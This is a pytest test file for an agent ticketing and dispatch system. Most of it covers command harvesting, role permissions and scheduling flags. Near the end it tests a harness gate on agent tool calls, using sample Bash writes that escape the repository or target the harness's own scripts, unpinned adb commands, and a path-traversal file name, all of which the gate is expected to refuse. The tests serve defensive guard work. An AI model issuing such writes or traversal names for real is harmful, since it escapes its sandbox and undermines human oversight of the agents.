    # The rule keys off the INVOCATION: in every segment where pytest appears,
    # the program in command position must be the venv's interpreter or one of
    # the CI script's pinned absolute paths.
    import shutil
    # scratch pin (see the DEBT-0004 test above): the rule must judge the
    # shapes below in a repo whose CI pins an interpreter. /usr/bin/python3,
    # not sys.executable — Homebrew paths carry '@', outside the harvest
    # regex's path alphabet.
    with tempfile.TemporaryDirectory() as td:
        script = os.path.join(os.path.realpath(td), "run_tests.sh")
        with open(script, "w") as f:
            f.write("#!/bin/sh\nPYTHON=%s\n$PYTHON -m pytest tests -q\n"
                    % "/usr/bin/python3")
        orig_cfg = lib.load_run_config
        lib._PINNED_RUNNERS.clear()
        try:
            lib.load_run_config = lambda: dict(orig_cfg(), ci_command=script)
            pin = "/usr/bin/python3"
            accepted = [
                "%s -m pytest agenticflow/scripts/test_factory.py -q" % pin,
                "cd agenticflow && %s -m pytest scripts/test_factory.py -q" % pin,
                "cd app && .venv/bin/python -m pytest -q tests",
                # the shape landed tickets already use: the pin runs one level down
                'bash -c "%s -m pytest agenticflow/scripts/test_factory.py -q"' % pin,
                "sh -c '%s -m pytest a.py -q && %s -m pytest b.py -q'" % (pin, pin),
                # an env-assignment prefix does not move the program out of position
                "PYTHON=%s %s -m pytest tests -q" % (pin, pin),
            ]
            for c in accepted:
                assert not lib.check_defects([c]), "must stay fileable: %s" % c
            refused = [
                # repro 1/2: the second segment runs a bare pytest -> exits 127
                "%s -m pytest a.py -q && pytest b.py -q" % pin,
                # repro 3, the silent one: the pytest bar exits 127, the COMMAND
                # exits 0, and the ticket carries a green bar that ran no test
                "pytest tests -q ; %s --version" % pin,
                # repro 4: the pin as a mere argument, and as a trailing comment
                "pytest tests -q --rootdir %s" % pin,
                "pytest tests -q  # %s" % pin,
                # pipes and || are segment boundaries too
                "pytest tests -q | grep -q passed",
                "%s --version || pytest tests -q" % pin,
                # nesting does not launder it: the inner second segment is still bare
                "sh -c '%s -m pytest a.py -q && pytest b.py -q'" % pin,
            ]
            for c in refused:
                assert lib.check_defects([c]), "must be refused at birth: %s" % c
            # ...and the two claims above are MEASURED, not asserted from theory: on a
            # machine where pytest is not on PATH (this one — pytest lives only on the
            # pinned interpreter), the first refused shape really does exit 127 and
            # the second really does exit 0 having run nothing.
            if shutil.which("pytest") is None:
                with tempfile.TemporaryDirectory() as tmp:
                    r = subprocess.run(["sh", "-c", "%s --version && pytest b.py -q"
                                        % pin], cwd=tmp, capture_output=True)
                    assert r.returncode == 127, r.returncode
                    r = subprocess.run(["sh", "-c", "pytest tests -q ; %s --version"
                                        % pin], cwd=tmp, capture_output=True)
                    assert r.returncode == 0, r.returncode
        finally:
            lib.load_run_config = orig_cfg
            lib._PINNED_RUNNERS.clear()


def test_pinned_runners_is_read_from_the_ci_script_not_hardcoded():
    # The constraint on the fix: what teaches the guard about this repo must
    # come from something already true on disk (the CI script's PYTHON pin),
    # never a second copy of the path. Proof: point the ci_command at a
    # different script and the answer changes with it.
    with tempfile.TemporaryDirectory() as tmp:
        script = os.path.join(tmp, "run_tests.sh")
        with open(script, "w") as f:
            f.write("#!/bin/bash\n"
                    "# commented-out pin: /bin/cat -m pytest\n"
                    "PYTHON=\"${PYTHON:-/bin/sh}\"\n"
                    "\"$PYTHON\" -m pytest tests -q\n"
                    "/no/such/interpreter -m pytest tests -q\n")
        orig_cfg = lib.load_run_config
        lib._PINNED_RUNNERS.clear()
        try:
            lib.load_run_config = lambda: dict(orig_cfg(), ci_command=script)
            pins = lib.pinned_runners()
        finally:
            lib.load_run_config = orig_cfg
            lib._PINNED_RUNNERS.clear()
    assert "/bin/sh" in pins, pins
    assert "/bin/cat" not in pins, "a commented-out path is not a pin"
    assert "/no/such/interpreter" not in pins, "a pin absent here is no pin"
    # and the real repo's pin is not this fixture's — the set is derived
    assert "/bin/sh" not in lib.pinned_runners()


def test_prose_command_ending_in_a_quote_keeps_its_closing_quote():
    # QA/BUG-A: a45e455 added .strip("'\"") to the prose harvest
    # (lib_ticket.py:308) so DEBT-0004's quoted-prose form could shed its
    # delimiters. It also eats the CLOSING quote of a command that
    # legitimately ENDS in one -- TASK-0016 criterion 12 and TASK-0019
    # criterion 11 are exactly that shape -- and the harvested string is then
    # unbalanced shell that no receipt can ever run (sh: unexpected EOF,
    # exit 2). Both halves are pinned here: the delimiters still come off the
    # quoted form, and a command that ends in a quote of its own keeps it.
    pin = "/usr/bin/python3"  # shape only — the harvest never consults pins
    src = "bash -c '%s -m pytest tests/t.py -q'" % pin
    assert src in _criteria("12. %s exits 0" % src), _criteria(
        "12. %s exits 0" % src)
    # nothing harvested from ANY prose form may be unparseable shell: the
    # gate runs these with shell=True, so a truncated quote is a guaranteed
    # false-RED on correct work.
    prose = ["12. %s exits 0" % src,
             "3. 'grep -q \"x\" app.css' exits 0",
             "4. 'test \"$(ls | wc -l)\" -eq 3' exits 0",
             "5. cd mobile && ./node_modules/.bin/tsc --noEmit exits 0"]
    for p in prose:
        for c in _criteria(p):
            r = subprocess.run(["bash", "-n", "-c", c], capture_output=True,
                               text=True)
            assert r.returncode == 0, "unparseable %r from %r: %s" % (
                c, p, r.stderr)
    # the quoted-prose form still sheds its delimiters (DEBT-0004's feature —
    # a fix that merely drops the strip regresses it)
    assert _criteria("3. 'grep -q \"x\" app.css' exits 0") == [
        'grep -q "x" app.css']
    # and every command the gate would run for a ticket in the tree parses
    tickets = lib.load_all()
    for tid in ("TASK-0016", "TASK-0019"):
        if tid not in tickets:
            continue
        for c in lib.criteria_commands(tickets[tid]["body"]):
            r = subprocess.run(["bash", "-n", "-c", c], capture_output=True)
            assert r.returncode == 0, "%s harvests unparseable %r" % (tid, c)



def test_prose_delimiter_is_shed_on_balance_not_on_quote_count():
    # BUG-0067 fix, the half a character count gets wrong. The orphan closing
    # delimiter of the quoted-prose form has to come off, but "this quote is
    # unmatched" is a property of the QUOTING, not of how many times the
    # character occurs: a ' inside "..." is a literal, so here the count of '
    # is EVEN exactly when the span is UNBALANCED. Counting keeps the orphan
    # and hands the gate shell that exits 2 — the same false-RED BUG-0067 is
    # about, just one prose form over.
    prose = "3. 'grep -q \"it's here\" f' exits 0"
    assert _criteria(prose) == ['grep -q "it\'s here" f'], _criteria(prose)
    for c in _criteria(prose):
        r = subprocess.run(["bash", "-n", "-c", c], capture_output=True,
                           text=True)
        assert r.returncode == 0, "unparseable %r: %s" % (c, r.stderr)
    # and the shed never fires on a span that is already whole, whichever
    # quote kind is doing the wrapping
    pin = "/usr/bin/python3"  # shape only — the harvest never consults pins
    for src in ('bash -c "%s -m pytest tests/t.py -q"' % pin,
                "bash -c '%s -m pytest tests/t.py -q'" % pin):
        assert src in _criteria("1. %s exits 0" % src), src



def _seed_ticket(tmp, tid, milestone="null", priority="P2"):
    path = os.path.join(tmp, tid + ".md")
    with open(path, "w", encoding="utf-8") as f:
        f.write("---\nid: %s\ntype: bug\nstatus: open\nmilestone: %s\n"
                "priority: %s\nopened_by: qa\nparent: null\nchildren: []\n"
                "assignee: null\nclaimed_at: null\ndepends_on: []\n"
                "touch_scope: [app/a.py]\nforce: false\n---\n"
                "# seeded\n\n## Description\nx\n\n## History\n- seeded\n"
                % (tid, milestone, priority))
    return path


def test_set_milestone_and_set_priority_cli_help_and_note_gate():
    # The verbs must exist as CLI surface (that is how an architect reaches
    # them), and neither may record a ruling without a reason.
    tp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ticket.py")
    for verb, value in (("set-milestone", "M2"), ("set-priority", "P1")):
        r = subprocess.run([sys.executable, tp, verb, "--help"],
                           capture_output=True, text=True)
        assert r.returncode == 0, (verb, r.stderr)
        # no --note: refused by the parser, before any ticket is touched
        r = subprocess.run([sys.executable, tp, verb, "TASK-0000", value,
                            "--as", "architect"], capture_output=True, text=True)
        assert r.returncode != 0, (verb, r.stdout)
        assert "--note" in r.stderr, (verb, r.stderr)



def test_set_milestone_and_set_priority_rulings_reach_the_frontmatter():
    # DEBT-0002: milestone and priority were settable only by `ticket.py new`,
    # so an architect ruling that CHANGED either one was unexecutable and
    # survived only as prose. Measured five times — BUG-0008 was ruled P1 and
    # still read P2 in the frontmatter the builder queue is ordered from;
    # BUG-0009 kept `milestone: null` and fell out of the milestone-close
    # check. These verbs are the legal door, with the same authority and audit
    # trail every other mutation has.
    import types
    import ticket
    with tempfile.TemporaryDirectory() as tmp:
        path = _seed_ticket(tmp, "BUG-9001")
        _seed_ticket(tmp, "BUG-9000")          # ordering foil, stays P2
        receipt = os.path.join(tmp, "BUG-9001.json")
        with open(receipt, "w") as f:
            json.dump({"green": True}, f)
        front = lambda: lib.parse_ticket(path)["front"]
        ns = types.SimpleNamespace
        orig = (lib.TICKETS, lib.RECEIPTS)
        lib.TICKETS, lib.RECEIPTS = tmp, tmp
        try:
            # authority: the architect rules scheduling; QA does not, and
            # neither does the builder who would like to be scheduled sooner
            for role in ("qa", "builder-2", "verifier", "dispatcher"):
                for fn, kw in ((ticket.cmd_set_milestone, {"milestone": "M1"}),
                               (ticket.cmd_set_priority, {"priority": "P0"})):
                    try:
                        fn(ns(id="BUG-9001", as_role=role, note="n", **kw))
                        assert False, "%s must not rule %s" % (role, kw)
                    except SystemExit as e:
                        assert "ERROR" in str(e), (role, kw)
            assert front()["milestone"] is None
            assert front()["priority"] == "P2"

            # priority validates against lib.PRIORITIES; milestone refuses
            # only an empty value (campaigns name their own milestones)
            for bad in ("P4", "p1", "high", "", "P"):
                try:
                    ticket.cmd_set_priority(ns(id="BUG-9001", note="n",
                                               as_role="architect", priority=bad))
                    assert False, "priority %r must be refused" % bad
                except SystemExit as e:
                    assert "ERROR" in str(e), bad
            try:
                ticket.cmd_set_milestone(ns(id="BUG-9001", note="n",
                                            as_role="architect", milestone="  "))
                assert False, "an empty milestone must be refused"
            except SystemExit as e:
                assert "ERROR" in str(e)
            assert front()["priority"] == "P2", "a refusal must write nothing"

            ticket.cmd_set_milestone(ns(id="BUG-9001", as_role="architect",
                                        milestone="M1", note="ruled at filing"))
            ticket.cmd_set_priority(ns(id="BUG-9001", as_role="architect",
                                       priority="P1", note="overrides QA's P2"))
            assert front()["milestone"] == "M1"
            assert front()["priority"] == "P1"
            # audited like every other mutation: actor, old value, new value,
            # and the reason — a bare setter would be a step down from prose
            body = open(path, encoding="utf-8").read()
            assert re.search(r"\[architect\] milestone: \(none\) → M1: "
                             r"ruled at filing", body), body
            assert re.search(r"\[architect\] priority: P2 → P1: "
                             r"overrides QA's P2", body), body
            # a receipt is evidence about the CRITERIA; neither field is a
            # criterion, so unlike amend-criteria this must not invalidate it
            assert os.path.exists(receipt), "ruling must not delete a receipt"

            # and the ruling reaches the QUEUE, not just the file: dispatch.py
            # orders the eligible set by (force, priority, id) read fresh off
            # the frontmatter each tick (dispatch.py, eligible.sort). Ordered
            # by id alone BUG-9000 leads; the ruling is what moves BUG-9001.
            order = [t["front"]["id"] for t in
                     sorted(lib.load_all().values(),
                            key=lambda t: ((0 if t["front"].get("force") else 1),
                                           t["front"].get("priority") or "P2",
                                           t["front"]["id"]))]
            assert order == ["BUG-9001", "BUG-9000"], order

            # idempotent: the receipt gate re-runs every criteria command, so
            # restating a landed ruling exits 0 and appends nothing
            before = open(path, encoding="utf-8").read()
            ticket.cmd_set_milestone(ns(id="BUG-9001", as_role="architect",
                                        milestone="M1", note="again"))
            ticket.cmd_set_priority(ns(id="BUG-9001", as_role="architect",
                                       priority="P1", note="again"))
            assert open(path, encoding="utf-8").read() == before
        finally:
            lib.TICKETS, lib.RECEIPTS = orig




def _raw_ticket(af, tid, ttype="task", status="open", parent=None,
                history="- 2026-01-01T00:00:00Z [test] seeded",
                claimed_at=None, assignee=None, scope="app/main.py",
                description="x"):
    """Seed a ticket file directly (state fixtures — the CLI's birth gates
    are their own tests; these tests need exact sizes/statuses)."""
    path = os.path.join(af, "tracker", "tickets", tid + ".md")
    with open(path, "w", encoding="utf-8") as f:
        f.write("---\nid: %s\ntype: %s\nstatus: %s\nmilestone: null\n"
                "priority: P2\nopened_by: test\nparent: %s\nchildren: []\n"
                "assignee: %s\nclaimed_at: %s\ndepends_on: []\n"
                "touch_scope: [%s]\nforce: false\n---\n"
                "# %s\n\n## Description\n%s\n\n## History\n%s\n"
                % (tid, ttype, status, parent or "null", assignee or "null",
                   claimed_at or "null", scope, tid, description, history))
    return path


def test_built_blocked_edge_and_architect_unblock():
    # TASK-0053 (2026-08-10): a block discovered AFTER built had no legal
    # route — builder and dispatcher both hit the missing edge and the
    # dispatcher hand-held the ticket out of qa_batches indefinitely. Same
    # roles as the other blocked edges: a block is discovered by whoever
    # holds the ticket when the surprise lands. And the architect may now
    # reopen a ticket blocked on its own ruling (BUG-0043: the brief said
    # to, the tool refused, and the fact waited on a 12h sweep).
    import ticket
    for role in ("builder", "architect", "qa", "dispatcher"):
        assert ticket.transition_allowed("built", "blocked", role), role
    assert not ticket.transition_allowed("built", "blocked", "verifier")
    assert not ticket.transition_allowed("built", "blocked", "strategist")
    # built->open stays closed (one instance, may be deliberate — flagged
    # in the proposal, not ruled)
    assert not ticket.transition_allowed("built", "open", "builder")
    assert not ticket.transition_allowed("built", "open", "dispatcher")
    assert ticket.transition_allowed("blocked", "open", "architect")
    assert ticket.transition_allowed("blocked", "open", "dispatcher")
    assert not ticket.transition_allowed("blocked", "open", "builder")
    assert not ticket.transition_allowed("blocked", "open", "qa")


def test_strategist_rules_milestone_but_never_priority():
    # DEBT-0008 residue (2026-08-10): milestone membership is the
    # strategist's charter, and without the verb it closed real-but-not-
    # this-milestone tickets wont_fix. Priority stays architect-only.
    import types
    import ticket
    with tempfile.TemporaryDirectory() as tmp:
        path = _seed_ticket(tmp, "BUG-9100")
        ns = types.SimpleNamespace
        orig = (lib.TICKETS, lib.RECEIPTS)
        lib.TICKETS, lib.RECEIPTS = tmp, tmp
        try:
            ticket.cmd_set_milestone(ns(id="BUG-9100", as_role="strategist",
                                        milestone="M3",
                                        note="real, but next milestone"))
            assert lib.parse_ticket(path)["front"]["milestone"] == "M3"
            try:
                ticket.cmd_set_priority(ns(id="BUG-9100", as_role="strategist",
                                           priority="P1", note="n"))
                assert False, "the strategist must not rule priority"
            except SystemExit as e:
                assert "ERROR" in str(e)
        finally:
            lib.TICKETS, lib.RECEIPTS = orig


def test_amend_was_reference_is_bounded_not_verbatim():
    # [was: ...] stored the WHOLE prior value — 1780 B (23% of History) of
    # verbatim self-duplication in one ticket (TASK-0044, 2026-08-11). The
    # reference identifies the old value; git history carries the bytes.
    import ticket
    assert ticket._was("short old value") == "short old value"
    ref = ticket._was("criterion " + "x" * 5000)
    assert len(ref) < 200, ref
    assert "5010 chars" in ref and "git history" in ref, ref
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        big = ("the bar is walkable and reads right (human-checkable) "
               + "detail " * 700)
        _run(af, "ticket.py", "new", "--type", "TASK", "--title", "t",
             "--as", "architect", "--criteria", big)
        _run(af, "ticket.py", "amend-criteria", "TASK-0001",
             "--as", "architect", "--criteria", "recut bar (human-checkable)",
             "--note", "recut")
        body = open(os.path.join(af, "tracker", "tickets", "TASK-0001.md"),
                    encoding="utf-8").read()
        assert "[was: " in body and "full text in git history" in body, body
        assert "detail " * 50 not in body, \
            "the amend must not re-store the replaced criteria verbatim"


def test_compact_flag_measures_history_not_the_file():
    # 2026-08-11: 11 flags, 8 compactor spawns, 293 bytes shed — 10 of 11
    # flagged tickets were body-heavy, and History is the only section a
    # compactor may rewrite. A big immutable body reports oversized_body
    # (informational, spawns nobody) instead of a compactor treadmill.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        _raw_ticket(af, "TASK-0001", description="b" * 9001)   # body-heavy
        _raw_ticket(af, "TASK-0002",
                    history="\n".join("- 2026-01-01T00:00:00Z [test] "
                                      "measured fact %03d %s" % (i, "y" * 40)
                                      for i in range(130)))    # history-heavy
        plan = json.loads(_run(af, "dispatch.py"))
        kinds = {(f["kind"], f.get("id")) for f in plan["flags"]}
        assert ("oversized_body", "TASK-0001") in kinds, plan["flags"]
        assert ("compact_candidate", "TASK-0001") not in kinds, plan["flags"]
        assert ("compact_candidate", "TASK-0002") in kinds, plan["flags"]
        assert ("oversized_body", "TASK-0002") not in kinds, plan["flags"]
        # oversized_body fires ONCE per ticket (kspace 2026-08-13: the flag
        # re-fired every tick and its only silencer was a compactor/human
        # raise — 14 spawns bought 12 "irreducible" rubber stamps). The
        # History-churn flag has no such dedup and keeps firing.
        plan2 = json.loads(_run(af, "dispatch.py"))
        kinds2 = {(f["kind"], f.get("id")) for f in plan2["flags"]}
        assert ("oversized_body", "TASK-0001") not in kinds2, plan2["flags"]
        assert ("compact_candidate", "TASK-0002") in kinds2, plan2["flags"]


def test_dispatch_drops_ask_ben_blocked_tickets_for_human():
    # Proposal ui-surface-human-queue (kspace 2026-08-12): TASK-0022's
    # human-only ruling sat blocked for hours in streams that scroll away.
    # A blocked "ASK BEN…" ticket lands in tracker/for-human/ the tick it
    # is seen; the human's deletion is the ack and is never overridden.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        path = _raw_ticket(af, "TASK-0001", status="blocked")
        body = open(path).read().replace(
            "# TASK-0001", "# ASK BEN: which leg completes the trio?")
        open(path, "w").write(body)
        _raw_ticket(af, "TASK-0002", status="blocked")   # machine-blocked
        _run(af, "dispatch.py")
        drop = os.path.join(af, "tracker", "for-human", "TASK-0001.md")
        assert os.path.exists(drop), "ASK BEN blocked ticket not dropped"
        text = open(drop).read()
        assert "which leg completes the trio?" in text, text
        assert "Unblocks: TASK-0001" in text, text
        assert not os.path.exists(os.path.join(
            af, "tracker", "for-human", "TASK-0002.md")), \
            "machine-blocked ticket must not page the human"
        os.remove(drop)                                  # the human acks
        _run(af, "dispatch.py")
        assert not os.path.exists(drop), "deleted drop re-created (ack lost)"


def test_ui_waiting_panel_lists_and_acks():
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import ui
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        old = ui.FOR_HUMAN
        ui.FOR_HUMAN = os.path.join(tmp, "for-human")
        try:
            os.makedirs(ui.FOR_HUMAN)
            with open(os.path.join(ui.FOR_HUMAN, "TASK-0022.md"), "w") as f:
                f.write("# ASK BEN: stale claims — history or displace?\n\n"
                        "Recommend: option (b), born superseded\n"
                        "Unblocks: TASK-0022\n")
            rows = ui.waiting_view()
            assert len(rows) == 1, rows
            r = rows[0]
            assert r["question"].startswith("ASK BEN: stale claims"), r
            assert r["recommend"].startswith("option (b)"), r
            assert r["unblocks"] == "TASK-0022", r
            try:  # traversal defense: membership, not path arithmetic
                ui.ack_waiting("../tickets/TASK-0022.md")
                assert False, "traversal name accepted"
            except ValueError:
                pass
            ui.ack_waiting("TASK-0022.md")
            assert ui.waiting_view() == [], "ack did not clear the row"
        finally:
            ui.FOR_HUMAN = old


def test_parent_autoclose_requires_a_real_fanout():
    # FEAT-0007 (2026-08-11): a parent's ONLY child was the planning ticket;
    # it closed, "all children closed" was trivially true, and M2's headline
    # feature marked itself done with none of its work existing. A lone
    # closed child holds the parent open and flags instead.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        _raw_ticket(af, "FEAT-0001", ttype="feat")
        _raw_ticket(af, "TASK-0002", status="done", parent="FEAT-0001")
        plan = json.loads(_run(af, "dispatch.py"))
        front = lib.parse_ticket(
            os.path.join(af, "tracker", "tickets", "FEAT-0001.md"))["front"]
        assert front["status"] == "open", "single closed child must not close"
        assert any(f["kind"] == "parent_awaiting_fanout"
                   and f["id"] == "FEAT-0001"
                   for f in plan["flags"]), plan["flags"]
        _raw_ticket(af, "TASK-0003", status="done", parent="FEAT-0001")
        plan = json.loads(_run(af, "dispatch.py"))
        front = lib.parse_ticket(
            os.path.join(af, "tracker", "tickets", "FEAT-0001.md"))["front"]
        assert front["status"] == "done", "a real closed fan-out still closes"
        assert any(f["kind"] == "parent_autoclosed" and f["id"] == "FEAT-0001"
                   for f in plan["flags"]), plan["flags"]


def test_scope_collision_is_flagged_never_scheduled_around():
    # Worktrees isolate builds, not landings (2026-07-24: ~150k tokens of
    # re-derive on one same-destination collision; 2026-08-11: eight tickets
    # hand-chained after the third manual catch). The scheduler stays
    # scope-blind — both tickets still assign — but the overlap is surfaced.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        _raw_ticket(af, "TASK-0001", scope="app/main.py")
        _raw_ticket(af, "TASK-0002", scope="app/main.py")
        _raw_ticket(af, "TASK-0003", scope="app/other.py")
        plan = json.loads(_run(af, "dispatch.py"))
        assert set(plan["assign_to_builders"]) == \
            {"TASK-0001", "TASK-0002", "TASK-0003"}, plan["assign_to_builders"]
        hits = [f for f in plan["flags"] if f["kind"] == "scope_collision"]
        assert len(hits) == 1, plan["flags"]
        assert hits[0]["ids"] == ["TASK-0001", "TASK-0002"], hits
        assert hits[0]["paths"] == ["app/main.py"], hits


def test_stale_release_consults_the_spawn_ledger():
    # 2026-08-11: the 90-minute timer released two live builders — one
    # delivered finished work ten minutes after being declared dead — and
    # the default next tick would have spawned a second builder into the
    # same worktree. In-session release is now conjunctive: timer AND the
    # spawn ledger shows no agent in flight. Session start stays blanket.
    from datetime import datetime, timedelta, timezone
    old = (datetime.now(timezone.utc) - timedelta(hours=3)) \
        .strftime("%Y-%m-%dT%H:%M:%SZ")
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        _raw_ticket(af, "TASK-0001", status="claimed", claimed_at=old,
                    assignee="builder-1")
        ledger = os.path.join(af, "tracker", "spawn_log.tsv")
        with open(ledger, "w") as f:
            f.write("2026-01-01T00:00:00Z\tbuilder\tTASK-0001\tspawned\n")
        plan = json.loads(_run(af, "dispatch.py"))
        front = lib.parse_ticket(
            os.path.join(af, "tracker", "tickets", "TASK-0001.md"))["front"]
        assert front["status"] == "claimed", "live agent must not be released"
        assert any(f["kind"] == "claim_aged_but_live" and f["id"] == "TASK-0001"
                   for f in plan["flags"]), plan["flags"]
        assert not any(f["kind"] == "stale_released"
                       for f in plan["flags"]), plan["flags"]
        # the agent returns: unmatched spawn consumed -> the timer release
        with open(ledger, "a") as f:
            f.write("2026-01-01T01:00:00Z\tbuilder\tTASK-0001\t123\n")
        plan = json.loads(_run(af, "dispatch.py"))
        front = lib.parse_ticket(
            os.path.join(af, "tracker", "tickets", "TASK-0001.md"))["front"]
        assert front["status"] == "open", "dead claim past the timer releases"
        assert any(f["kind"] == "stale_released" for f in plan["flags"])
        # session start releases EVERYTHING, ledger or no ledger: an agent
        # cannot survive a session boundary, and a crash leaves an unmatched
        # spawned row forever
        _raw_ticket(af, "TASK-0002", status="claimed", claimed_at=old,
                    assignee="builder-2")
        with open(ledger, "a") as f:
            f.write("2026-01-01T02:00:00Z\tbuilder\tTASK-0002\tspawned\n")
        json.loads(_run(af, "dispatch.py", "--session-start"))
        front = lib.parse_ticket(
            os.path.join(af, "tracker", "tickets", "TASK-0002.md"))["front"]
        assert front["status"] == "open", "session start is a blanket release"


def test_worktree_shares_node_modules_but_never_android():
    # node_modules: four builders per run rediscovered the missing tree,
    # hand-linked and deleted it (2026-08-04/-11) — dispatch links it. But
    # NOT android/: a gradle project is a build system rooted at its
    # PARENT, so a symlinked android/ builds the PRIMARY's sources from any
    # worktree — createBundleReleaseJsAndAssets reported UP-TO-DATE against
    # a builder's own edits (KV BUG-0071). No android/ fails loudly; a
    # linked one silently measures another tree.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        os.makedirs(os.path.join(tmp, "app", "node_modules", ".bin"))
        os.makedirs(os.path.join(tmp, "app", "android"))
        with open(os.path.join(tmp, "app", "android", "gradlew"), "w") as f:
            f.write("#!/bin/sh\n")
        _raw_ticket(af, "TASK-0001")
        plan = json.loads(_run(af, "dispatch.py"))
        assert "TASK-0001" in plan["assign_to_builders"], plan
        wt = os.path.join(af, ".worktrees", "TASK-0001")
        nm = os.path.join(wt, "app", "node_modules")
        assert os.path.islink(nm), "node_modules must be symlinked"
        assert os.path.realpath(nm) == \
            os.path.realpath(os.path.join(tmp, "app", "node_modules"))
        assert not os.path.lexists(os.path.join(wt, "app", "android")), \
            "android must NOT be linked — it would build the primary tree"


def test_artifact_gate_resolves_cd_relative_targets():
    # Five evidence writes were refused as "outside repo" because the gate
    # resolved `../` against the session cwd and could not see the leading
    # `cd app` (KV, 2026-08-11). Both directions fix: evidence writes from a
    # subdir pass, and `cd agenticflow && > scripts/x.py` no longer
    # mis-locates AWAY from machinery. The final absolute path is still the
    # judge — a genuine escape still blocks.
    def gate(cmd, proj):
        payload = json.dumps({"tool_name": "Bash",
                              "tool_input": {"command": cmd}, "cwd": proj})
        env = dict(os.environ, CLAUDE_PROJECT_DIR=proj)
        return subprocess.run([sys.executable, ARTIFACT_GATE], input=payload,
                              capture_output=True, text=True, env=env)
    with tempfile.TemporaryDirectory() as td:
        proj = os.path.realpath(td)
        os.makedirs(os.path.join(proj, "agenticflow", "tracker"))
        os.makedirs(os.path.join(proj, "app"))
        open(os.path.join(proj, "agenticflow", "tracker", "RUNNING"),
             "w").close()
        cases = [
            ("cd app && echo x > "
             "../agenticflow/tracker/evidence/BUG-1/prebuild.log", 0),
            ("cd app && echo x > ../../stray.log", 2),
            ("cd agenticflow && echo x > scripts/ticket.py", 2),
            ("cd /tmp && echo x > y.log", 2),
            ("cd app; cd .. && echo x > "
             "agenticflow/tracker/evidence/BUG-1/two-hops.log", 0),
        ]
        for cmd, want in cases:
            r = gate(cmd, proj)
            assert r.returncode == want, (cmd, r.returncode, r.stderr)


def test_filer_corrects_its_own_unclaimed_filing():
    # Four cross-role round trips in one run for mis-shapes their own
    # author had written out in full (KV BUG-0071/0072/0073/0075): the
    # filer may repair its own filing while nobody has claimed it. The
    # window closes at claim; other roles stay refused; rulings
    # (set-priority/milestone, contract) are untouched by the clause.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        tp = os.path.join(af, "scripts", "ticket.py")
        _run(af, "ticket.py", "new", "--type", "BUG", "--title", "found it",
             "--as", "qa", "--scope", "app/main.py",
             "--check", "test -f app/main.py")
        _run(af, "ticket.py", "amend-checks", "BUG-0001",
             "--check", "test -x app/main.py || test -f app/main.py",
             "--as", "qa", "--note", "my own check was the wrong shape")
        _run(af, "ticket.py", "amend-scope", "BUG-0001",
             "--scope", "app/main.py,app/other.py",
             "--as", "qa", "--note", "fix spans both files")
        r = subprocess.run([sys.executable, tp, "amend-checks", "BUG-0001",
                            "--check", "true", "--as", "verifier",
                            "--note", "n"], capture_output=True, text=True)
        assert r.returncode != 0, "another role is still refused"
        _run(af, "ticket.py", "claim", "BUG-0001", "--as", "builder-1")
        r = subprocess.run([sys.executable, tp, "amend-checks", "BUG-0001",
                            "--check", "true", "--as", "qa", "--note", "n"],
                           capture_output=True, text=True)
        assert r.returncode != 0 and "claimed" in r.stderr, \
            "the window closes the instant anyone claims"


def test_new_scope_repeats_and_comma_splits():
    # KV BUG-0072: two --scope flags, argparse silently kept the last — the
    # fix's source file fell out of scope and the doc file stayed in. Both
    # spellings now work and neither loses data.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        _run(af, "ticket.py", "new", "--type", "BUG", "--title", "s",
             "--as", "qa", "--scope", "app/a.py",
             "--scope", "app/b.py,app/c.py",
             "--criteria", "`test -f app/main.py` exits 0")
        front = lib.parse_ticket(
            os.path.join(af, "tracker", "tickets", "BUG-0001.md"))["front"]
        assert front["touch_scope"] == ["app/a.py", "app/b.py", "app/c.py"]


def test_unpinned_adb_refused_and_own_avd_writable():
    # TASK-0045 (2026-08-11): a bare adb call targeted the bus's choice and
    # a QA's taps advanced another project's live app. Device-targeting adb
    # without -s is refused; discovery/server subcommands stay free; and the
    # AVD home is writable — telling agents to build their own device while
    # blocking its config.ini is a closed loop.
    def gate(tool, tool_input, proj, extra=None):
        payload = json.dumps({"tool_name": tool, "tool_input": tool_input,
                              "cwd": proj})
        env = dict(os.environ, CLAUDE_PROJECT_DIR=proj)
        env.update(extra or {})
        return subprocess.run([sys.executable, ARTIFACT_GATE], input=payload,
                              capture_output=True, text=True, env=env)
    with tempfile.TemporaryDirectory() as proj, \
            tempfile.TemporaryDirectory() as avd_home:
        proj = os.path.realpath(proj)
        trk = os.path.join(proj, "agenticflow", "tracker")
        os.makedirs(trk)
        open(os.path.join(trk, "RUNNING"), "w").close()
        cases = [
            ("adb shell input tap 100 200", 2),
            ("adb install app.apk", 2),
            ("adb shell am start -n com.x/.Main", 2),
            ("cd app && adb logcat -d", 2),
            ("adb devices", 0),
            ("adb kill-server", 0),
            ("adb connect 192.168.0.9:5555", 0),
            ("adb mdns services", 0),          # wireless-adb discovery
            ("adb pair 192.168.0.9:37099", 0),  # pairing targets no serial
            ("adb -s emulator-5600 shell input tap 100 200", 0),
            ("adb -s emulator-5600 install app.apk", 0),
            ("echo adb is not invoked here", 0),
        ]
        for cmd, want in cases:
            r = gate("Bash", {"command": cmd}, proj)
            assert r.returncode == want, (cmd, r.returncode, r.stderr)
        r = gate("Bash", {"command": "adb shell input tap 1 2"}, proj)
        assert "-s" in r.stderr and "TASK-0045" in r.stderr, r.stderr
        # the agent's own AVD home is not "outside the repo"
        env = {"ANDROID_AVD_HOME": avd_home}
        ini = os.path.join(avd_home, "walk.avd", "config.ini")
        r = gate("Write", {"file_path": ini}, proj, extra=env)
        assert r.returncode == 0, r.stderr
